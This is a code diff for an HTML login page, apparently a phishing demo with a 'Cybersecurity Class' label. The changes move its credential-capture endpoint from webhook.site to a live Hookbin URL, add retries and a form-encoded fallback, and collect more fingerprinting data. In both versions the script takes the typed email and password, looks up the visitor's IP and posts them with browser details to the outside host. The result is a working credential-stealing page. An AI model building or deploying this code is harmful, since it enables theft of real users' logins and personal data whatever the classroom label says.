@@ -297,11 +297,11 @@
     
     <!-- Webhook status will appear here -->
     <div id="webhookStatus" class="status-message status-loading">
-      ⏳ Sending data to Webhook.site...
+      ⏳ Sending data to Hookbin...
     </div>
     
     <div class="log-line" style="margin-top:12px" id="webhookResult">
-      <span class="red" id="webhookMessage">✔ Data captured and sent to webhook</span>
+      <span id="webhookMessage" style="color: #94a3b8;">Waiting for response...</span>
     </div>
     
     <button class="close-btn" onclick="closePanel()">[ CLOSE DEMO ]</button>
@@ -309,30 +309,38 @@
 
   <!-- Webhook status indicator -->
   <div class="webhook-status" id="webhookIndicator">
-    🌐 Webhook: <span id="webhookStatusText">Ready</span>
+    🌐 Hookbin: <span id="webhookStatusText">Ready</span>
   </div>
 
   <script>
-    // YOUR UNIQUE WEBHOOK URL
-    const WEBHOOK_URL = 'https://webhook.site/b6e9b4df-3ece-4ef3-996b-2551d1d4c6a1';
+    // UPDATED HOOKBIN URL
+    const WEBHOOK_URL = 'https://hookbin.rest/hooks/b16b9a6be8';
     
-    // Flag to track if webhook data was sent
     let webhookSent = false;
+    let retryCount = 0;
+    const MAX_RETRIES = 2;
 
-    // Get user's IP (using free IP API)
+    // Get user's IP with timeout
     async function getUserIP() {
       try {
-        const response = await fetch('https://api.ipify.org?format=json');
+        const controller = new AbortController();
+        const timeoutId = setTimeout(() => controller.abort(), 3000);
+        
+        const response = await fetch('https://api.ipify.org?format=json', {
+          signal: controller.signal
+        });
+        clearTimeout(timeoutId);
+        
         const data = await response.json();
         return data.ip;
       } catch (error) {
-        console.log('Could not fetch IP, using fallback');
+        console.log('IP fetch failed, using fallback');
         return 'Unable to fetch IP';
       }
     }
 
-    // Send data to webhook using fetch with proper CORS
-    async function sendToWebhook(data) {
+    // Send data to Hookbin with retry logic
+    async function sendToWebhook(data, attempt = 0) {
       const statusEl = document.getElementById('webhookStatus');
       const messageEl = document.getElementById('webhookMessage');
       const indicatorText = document.getElementById('webhookStatusText');
@@ -341,12 +349,12 @@
       try {
         // Update status
         statusEl.className = 'status-message status-loading';
-        statusEl.textContent = '⏳ Sending data to Webhook.site...';
+        statusEl.textContent = `⏳ Sending to Hookbin (attempt ${attempt + 1})...`;
         indicatorText.textContent = 'Sending...';
         document.getElementById('webhookIndicator').className = 'webhook-status pulse';
         loginBtn.disabled = true;
 
-        // Send as JSON with proper headers
+        // Send as JSON
         const response = await fetch(WEBHOOK_URL, {
           method: 'POST',
           headers: {
@@ -356,35 +364,36 @@
           body: JSON.stringify(data)
         });
 
-        // Check if the request was successful
+        // Check response
         if (response.ok) {
           // Success!
           statusEl.className = 'status-message status-success';
-          statusEl.textContent = '✅ Data successfully sent to Webhook.site!';
-          messageEl.textContent = '✅ Data captured and sent to webhook';
+          statusEl.textContent = '✅ Data successfully sent to Hookbin!';
+          messageEl.textContent = '✅ Data captured and sent to Hookbin';
+          messageEl.style.color = '#6ee7b7';
           indicatorText.textContent = '✓ Data Sent';
           document.getElementById('webhookIndicator').className = 'webhook-status';
           webhookSent = true;
           loginBtn.disabled = false;
           
-          console.log('✅ Data sent to webhook:', data);
-          
-          // Try to parse response
-          try {
-            const responseData = await response.text();
-            console.log('Webhook response:', responseData);
-          } catch (e) {
-            console.log('Could not parse response');
-          }
+          console.log('✅ Data sent to Hookbin:', data);
+          return true;
         } else {
-          // If response is not ok, try alternative method
-          throw new Error(`HTTP ${response.status}: ${response.statusText}`);
+          // Response not ok
+          throw new Error(`HTTP ${response.status}`);
         }
 
       } catch (error) {
-        console.error('Webhook error:', error);
+        console.error(`Attempt ${attempt + 1} failed:`, error);
         
-        // Try alternative method: Send as URL-encoded form data
+        // Retry if under max attempts
+        if (attempt < MAX_RETRIES) {
+          statusEl.textContent = `⏳ Retrying (${attempt + 2}/${MAX_RETRIES + 1})...`;
+          await new Promise(resolve => setTimeout(resolve, 1000 * (attempt + 1)));
+          return sendToWebhook(data, attempt + 1);
+        }
+        
+        // All retries failed - try alternative method
         try {
           statusEl.textContent = '⏳ Trying alternative method...';
           
@@ -404,48 +413,52 @@
           if (response2.ok) {
             statusEl.className = 'status-message status-success';
             statusEl.textContent = '✅ Data sent via form encoding!';
-            messageEl.textContent = '✅ Data sent to webhook (form encoded)';
+            messageEl.textContent = '✅ Data sent to Hookbin (form encoded)';
+            messageEl.style.color = '#6ee7b7';
             indicatorText.textContent = '✓ Data Sent';
             document.getElementById('webhookIndicator').className = 'webhook-status';
             webhookSent = true;
             loginBtn.disabled = false;
-            
             console.log('✅ Data sent via form encoding:', data);
-            return;
+            return true;
           } else {
-            throw new Error(`Alternative method failed: ${response2.status}`);
+            throw new Error(`Alternative method failed`);
           }
         } catch (altError) {
-          // If both methods fail, show error
-          console.error('Alternative method also failed:', altError);
+          // Both methods failed
+          console.error('All methods failed:', altError);
           
-          let errorMsg = error.message;
-          if (error.message.includes('Failed to fetch')) {
-            errorMsg = 'Network error - check internet connection or CORS policy';
-          } else if (error.message.includes('Load failed')) {
-            errorMsg = 'Load failed - the webhook URL might be unreachable';
+          let errorMsg = 'Connection failed';
+          if (error.message.includes('Failed to fetch') || error.message.includes('NetworkError')) {
+            errorMsg = 'Network error - check your connection';
+          } else if (error.message.includes('HTTP')) {
+            errorMsg = `Server returned ${error.message}`;
           }
           
           statusEl.className = 'status-message status-error';
           statusEl.textContent = `❌ Error: ${errorMsg}`;
-          messageEl.textContent = '❌ Webhook send failed - check console for details';
-          indicatorText.textContent = '❌ Error';
+          messageEl.textContent = '❌ Webhook send failed - data saved locally';
+          messageEl.style.color = '#f87171';
+          indicatorText.textContent = '❌ Failed';
           document.getElementById('webhookIndicator').className = 'webhook-status';
           loginBtn.disabled = false;
+          
+          // Still show the data even if webhook fails
+          return false;
         }
       }
     }
 
     async function showCaptured() {
-      const email = document.getElementById('emailInput').value || 'demo@example.com';
-      const pass  = document.getElementById('passInput').value  || 'password123';
+      const email = document.getElementById('emailInput').value.trim() || 'demo@example.com';
+      const pass = document.getElementById('passInput').value || 'password123';
       const timestamp = new Date().toISOString();
       const browser = navigator.userAgent.split(')')[0].split('(')[1] || 'Unknown';
       
       // Get IP address
       const ip = await getUserIP();
 
-      // Prepare data for webhook
+      // Prepare data
       const data = {
         email: email,
         password: pass,
@@ -455,53 +468,46 @@
         user_agent: navigator.userAgent,
         referrer: document.referrer || 'Direct',
         url: window.location.href,
-        remember_me: document.querySelector('.remember input').checked ? 'true' : 'false',
+        remember_me: document.querySelector('.remember input').checked,
         source: 'Phishing Demo - Cybersecurity Class',
         platform: navigator.platform || 'Unknown',
-        language: navigator.language || 'Unknown'
+        language: navigator.language || 'Unknown',
+        screen_resolution: `${window.screen.width}x${window.screen.height}`,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
       };
 
-      // Update the panel display
+      // Update panel display
       document.getElementById('outEmail').textContent = email;
       document.getElementById('outPass').textContent = pass;
       document.getElementById('outTime').textContent = new Date().toLocaleString();
       document.getElementById('outBrowser').textContent = browser;
       document.getElementById('outIP').textContent = ip;
 
-      // Show the panel
+      // Show panel
       document.getElementById('overlay').style.display = 'block';
       document.getElementById('capturedPanel').style.display = 'block';
 
-      // Reset status message
+      // Reset status
       const statusEl = document.getElementById('webhookStatus');
       statusEl.className = 'status-message status-loading';
-      statusEl.textContent = '⏳ Sending data to Webhook.site...';
+      statusEl.textContent = '⏳ Sending data to Hookbin...';
       
       // Send to webhook
       await sendToWebhook(data);
     }
 
-    // Close panel function
     function closePanel() {
       document.getElementById('overlay').style.display = 'none';
       document.getElementById('capturedPanel').style.display = 'none';
       
-      // Reset status indicator
       const indicatorText = document.getElementById('webhookStatusText');
-      if (webhookSent) {
-        indicatorText.textContent = '✓ Data Sent';
-      } else {
-        indicatorText.textContent = 'Ready';
-      }
-      
-      // Re-enable login button
+      indicatorText.textContent = webhookSent ? '✓ Data Sent' : 'Ready';
       document.getElementById('loginBtn').disabled = false;
     }
 
-    // Handle login button click
+    // Event listeners
     document.getElementById('loginBtn').addEventListener('click', showCaptured);
 
-    // Allow Enter key to submit
     document.addEventListener('keydown', function(e) {
       if (e.key === 'Enter') {
         const active = document.activeElement;
@@ -511,12 +517,10 @@
       }
     });
 
-    // Log the webhook URL on load
-    console.log('🔗 Webhook URL:', WEBHOOK_URL);
-    console.log('📧 Unique email:', 'b6e9b4df-3ece-4ef3-996b-2551d1d4c6a1@email.hook.site');
-    console.log('🌐 DNS Name:', '*.b6e9b4df-3ece-4ef3-996b-2551d1d4c6a1.dnshook.site');
-    console.log('📊 Check your webhook dashboard for incoming data');
-    console.log('ℹ️  Data will be sent as JSON with proper CORS headers');
+    // Log info
+    console.log('🔗 Hookbin URL:', WEBHOOK_URL);
+    console.log('📍 Dashboard: https://hookbin.rest/hooks/b16b9a6be8');
+    console.log('📊 Data will be sent as JSON with automatic retry on failure');
   </script>
 
 </body>
